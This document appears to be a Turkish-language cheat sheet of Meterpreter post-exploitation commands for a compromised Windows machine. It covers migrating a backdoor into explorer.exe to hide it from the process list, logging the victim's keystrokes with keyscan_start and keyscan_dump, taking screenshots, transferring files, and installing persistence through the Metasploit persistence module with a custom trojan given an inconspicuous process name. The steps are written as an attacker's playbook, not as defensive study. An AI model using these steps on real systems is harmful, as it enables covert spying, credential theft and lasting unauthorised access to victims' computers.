sessions -l   : sessionları listeler
sessions -1   : 1 numaralı sessiona geçiş yapar
background    : aktif olarak kullandığımız sessonu kapatmadan arkaplana alır. Böylece diğer sessionlara geçiş yapmamıza olanak sağlar.
sysinfo       : sistem bilgisini görüntüler.
help          : kullanabileceğimiz işlemleri görüntüler
ps(process)   : bilgisayarda çalışıyor olan işlemleri gösterir.
	PID denilen şey process id'dir
	kendi trojanımızı o listeden görüp windowsta düzenli olan başka bir işlemin içerine gizleyebiliriz
migrate 2824  : migrate göç anlamına gelir. backdoorumuzu 2824 PID'sine sahip olan işleme geçiş yapar. Bizim winde 2824 explorer.exe idi
	migrate işleminden sonra ps komutu çalışılırsa o ekranda backdoorumuz görünmez. Hackten sonra yapılması gerekilen ilk işlemdir
upload komutuyla yükleme, download komutuyla ise direkt roota indirme yapabiliriz
keyscan_start : victim'in klavyeden girdiği her şeyi kaydetmeye başlar.
	keyscan_dump dediğimiz zaman sniffer durur ve o zaman verileri terminalimize yazdırır.
screenshot    : ss alır


Baglantımızı sürekli hale getirmek için
background 
use exploit/windows/local/persistence
show options
set EXE_NAME   : Victimin bilgisayarında sürekli olarak çalışacak bu işlemin ismi dikkat çekmeyen bir işlem olmalı. winexplore.exe gibi
set SESSION    : 1 (Hangi sessionu işliyorsak)
show advanced
set EXE::Custom /var/www/html/backdoors/new_backdoor.exe : Bu seçenegi advanced sekmesinden görebiliriz. İşlem yapılmazsa sistem kendi hazırladıgı bi trojanı atayacaktır. Biz ise kendi hazırladığımız trojanın kendi bilgisayarımızdaki pathini girerek onu atıyoruz.
exploit

